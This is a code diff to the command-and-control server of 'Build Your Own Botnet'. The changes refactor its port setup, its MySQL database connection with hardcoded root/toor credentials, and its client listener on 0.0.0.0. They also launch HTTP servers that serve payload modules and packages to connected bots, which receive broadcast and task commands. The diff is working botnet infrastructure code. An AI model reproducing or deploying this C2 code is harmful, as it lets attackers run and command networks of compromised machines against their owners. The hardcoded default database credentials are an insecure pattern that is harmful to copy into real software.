@@ -70,6 +70,8 @@ _threads = {}
 
 _rootdir = os.getcwd()
 
+colorama.init(autoreset=True)
+
 
 
 # decorators
@@ -152,7 +154,7 @@ class Database(mysql.connector.MySQLConnection):
     global _debug
     global _threads
 
-    def __init__(self, **kwargs):
+    def __init__(self, host='localhost', user='root', password='toor', database='byob'):
 
         """
         connect to MySQL and setup the database
@@ -166,8 +168,8 @@ class Database(mysql.connector.MySQLConnection):
             database    name of the MySQL database to use
 
         """
-        super(Database, self).__init__(**kwargs)
-        self.config(**kwargs)
+        super(Database, self).__init__(host=host, user=user, password=password, database=database)
+        self.config(host=host, user=user, password=password, database=database)
         self.tasks  = {}
         self.setup  = self._setup()
         self.query  = self.cursor(dictionary=True)
@@ -439,7 +441,7 @@ class Database(mysql.connector.MySQLConnection):
 class Server(threading.Thread):
 
     """
-    Server (Build Your Own Botnet)
+    Command & Control Server (Build Your Own Botnet)
     
     """
     global _abort
@@ -447,31 +449,26 @@ class Server(threading.Thread):
     global _rootdir
     global _threads
 
-    def __init__(self, config='../config.ini', port=1337, **kwargs):
+    def __init__(self, port=8000, config='../config.ini'):
         """
         create a new Server instance
 
-            config      file path of configuration file
-
             port        port number for server to listen on
 
-            debug       enable/disable debugging mode
+            config      file path of API key configuration file
 
             
         """
         super(Server, self).__init__()
-        self.clients            = {}
-        self.current_client     = None
-        self._prompt            = None
-        self._count             = 1
-        self._lock              = threading.Lock()
-        self._active            = threading.Event()
-        self._socket            = self._get_socket()
-        self._text_color        = util.color()
-        self._text_style        = colorama.Style.DIM
-        self._prompt_color      = colorama.Fore.RESET
-        self._prompt_style      = colorama.Style.BRIGHT
-        self._commands          = {
+        self._prompt        = None
+        self._count         = 1
+        self._lock          = threading.Lock()
+        self._active        = threading.Event()
+        self._text_color    = util.color()
+        self._text_style    = colorama.Style.DIM
+        self._prompt_color  = colorama.Fore.RESET
+        self._prompt_style  = colorama.Style.BRIGHT
+        self._commands      = {
             'help'          :   self.help,
             'exit'          :   self.quit,
             'quit'          :   self.quit,
@@ -490,11 +487,15 @@ class Server(threading.Thread):
             'sendall'	    :   self.task_broadcast,
             'braodcast'     :   self.task_broadcast,
             'results'       :   self.task_list,
-            'tasks'         :   self.task_list}
-        self.name       = time.time()
-        self.config     = self._config(config)
-        self.database   = self._database()
-
+            'tasks'         :   self.task_list
+            }
+        self.clients        = {}
+        self.current_client = None
+        self.port           = port
+        self.name           = time.time()
+        self.config         = self._config(config)
+        self.database       = self._database()
+        
 
     def _server_prompt(self, data):
         with self._lock:
@@ -559,19 +560,25 @@ class Server(threading.Thread):
 
 
     def _config(self, config):
-        os.chdir(_rootdir)
-        conf = configparser.ConfigParser()
-        try:
-            conf.read(config)
-        except Exception as e:
-            self._error(str(e))
-        return conf
-
+        if isinstance(config, str):
+            assert os.path.isfile(config)
+            os.chdir(_rootdir)
+            conf = configparser.ConfigParser()
+            try:
+                conf.read(config)
+            except Exception as e:
+                self._error(str(e))
+            return conf
+        elif isinstance(config, dict):
+            return config
+        else:
+            raise Exception('invalid configuration - must be filename or dictionary object')
+        
                     
     def _database(self):
         os.chdir(_rootdir)
         with self._lock:
-            print(util.color() + colorama.Style.BRIGHT + "\n\n" + open('resources/banner.txt').read() + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.2'))
+            print(util.color() + colorama.Style.BRIGHT + "\n\n" + str(open('resources/banner.txt').read() if os.path.isfile('resources/banner.txt') else '') + colorama.Fore.WHITE + colorama.Style.DIM + '\n{:>40}\n{:>25}\n'.format('Build Your Own Botnet','v0.1.2'))
             print(colorama.Fore.YELLOW + colorama.Style.BRIGHT + "[?] " + colorama.Fore.RESET + colorama.Style.DIM + "Hint: show usage information with the 'help' command\n")
         db = None
         if self.config.has_section('database'):
@@ -580,30 +587,20 @@ class Server(threading.Thread):
                 with self._lock:
                     print(colorama.Fore.GREEN + colorama.Style.BRIGHT + "[+] " + colorama.Fore.RESET + colorama.Style.DIM + "Connected to database")
             except:
-                db = Database(host='localhost', user='root', password='toor', database='byob')
+                db = Database()
                 max_v = max(map(len, self.config['database'].values())) + 2
                 with self._lock:
                     print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost: %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v).rjust(max_v)))
         else:
             try:
-                db = Database(host='localhost', user='root', password='toor', database='byob')
+                db = Database()
             except:
                 db = Database()
                 max_v = max(map(len, self.config['database'].values())) + 2
                 with self._lock:
                     print(colorama.Fore.RED + colorama.Style.BRIGHT + "[-] " + colorama.Fore.RESET + colorama.Style.DIM + "Error: unable to connect to the currently configured MySQL database\n\thost:  %s\n\tuser: %s" % ('\x20' * 4 + ' ' * 4 + self.config['database'].get('host').rjust(max_v), '\x20' * 4 + ' ' * 4 + self.config['database'].get('user').rjust(max_v).rjust(max_v)))
+        assert isinstance(db, Database)
         return db
-
-
-    def _get_socket(self, port=1337):
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            s.bind(('0.0.0.0', port))
-            s.listen(10)
-            return s
-        except Exception as e:
-            self._error(str(e))
 
 
     def _get_client_by_id(self, client_id):
@@ -751,37 +748,13 @@ class Server(threading.Thread):
                 print('\nDisplay Settings\n\n  usage:  settings <type> <option> <color|style>\n  \n    type   - text, prompt\n    option - color, style\n    color  - black, white, blue, red, green, magenta, yellow\n    style  - dim, normal, bright\n\nDebugging Mode\n\t\n  usage: settings debug <on|off>\n')
 
 
-    def module_handler(self, port='1339'):
-        try:
-            dirname  = os.path.join(_rootdir, 'modules')
-            filename = os.path.join(dirname, 'moduleHandler.py')
-            return subprocess.Popen([filename, port, dirname], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-        except Exception as e:
-            self._error(str(e))
-
-
-    def package_handler(self, port='1340'):
-        try:
-            dirname  = os.path.join(_rootdir, 'packages')
-            filename = os.path.join(dirname, 'packageHandler.py')
-            return subprocess.Popen([filename, port, dirname], 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True)
-        except Exception as e:
-            self._error(str(e))
-
-
-    @threaded
-    def task_handler(self):
-        try:
-            task_handler = TaskServer()
-            task_handler.serve_until_stopped()
-        except Exception as e:
-            self._error(str(e))
-
-
     @threaded
     def client_handler(self, sock=None):
         if not sock:
-            sock = self._socket
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            sock.bind(('0.0.0.0', self.port))
+            sock.listen(10)
         while True:
             conn, addr = sock.accept()
             client  = Client(conn, name=self._count)
@@ -795,17 +768,41 @@ class Server(threading.Thread):
                 if self.current_client._prompt:
                     self.display(str(self.current_client._prompt) % int(self.current_client.name), end="")
 
+            
+    @threaded
+    def task_handler(self):
+        try:
+            port    = self.port + 1
+            handler = TaskServer(port=port)
+            handler.serve_until_stopped()
+        except Exception as e:
+            self._error(str(e))
+            
+
+    def package_handler(self):
+        try:
+            port    = self.port + 2
+            dirname = os.path.join(_rootdir, 'packages')
+            return subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', str(port)], 0, None, None, subprocess.PIPE, subprocess.PIPE, cwd=dirname, shell=True)
+        except Exception as e:
+            self._error(str(e))
+
+
+    def module_handler(self):
+        try:
+            port    = self.port + 3
+            dirname = os.path.join(_rootdir, 'modules')
+            return subprocess.Popen([sys.executable, '-m', 'SimpleHTTPServer', str(port)], 0, None, None, subprocess.PIPE, subprocess.PIPE, cwd=dirname, shell=True)
+        except Exception as e:
+            self._error(str(e))
+
 
     def task_send(self, command, client_id=None, connection=None):
-        
         client = None
-        
         if client_id:
             client = self._get_client_by_id(client_id)
-            
         elif connection:
             client = self._get_client_by_connection(connection)
-            
         else:
             self._error("missing required argument 'client_id' or 'connection'")
             
@@ -822,15 +819,11 @@ class Server(threading.Thread):
 
 
     def task_recv(self, client_id=None, connection=None):
-        
         client = None
-        
         if client_id:
             client = self._get_client_by_id(client_id)
-                
         if connection:
             client = self._get_client_by_connection(connection)
-            
         if client:
             try:
                 header_size = struct.calcsize("L")
@@ -1183,18 +1176,21 @@ class Client(threading.Thread):
 
 
 
-if __name__ == '__main__':
-    colorama.init(autoreset=True)
+def main():
     parser = argparse.ArgumentParser(prog='server.py', description="Command & Control Server (Build Your Own Botnet)", version='0.4.7')
-    parser.add_argument('-p','--port', type=int, default=1337, action='store', help='port for the server to listen on')
-    parser.add_argument('-d','--debug', action='store_true', default=True, help='enable debugging mode')
+    parser.add_argument('-p','--port', type=int, default=8000, action='store', help='port for the server to listen on')
     parser.add_argument('-c','--config', action='store', default='../config.ini', help='configuration file')
+    parser.add_argument('-d','--debug', action='store_true', default=False, help='enable debugging mode')
     try:
         options = parser.parse_args()
-        _debug  = options.debug
+        globals()['_debug']  = options.debug
         _threads['server'] = Server(port=options.port, config=options.config)
         _threads['server'].start()
     except Exception as e:
         print("\n" + colorama.Fore.RED + colorama.Style.NORMAL + "[-] " + colorama.Fore.RESET + "Error: %s" % str(e) + "\n")
         parser.print_help()
         sys.exit(0)
+
+
+if __name__ == '__main__':
+    main()
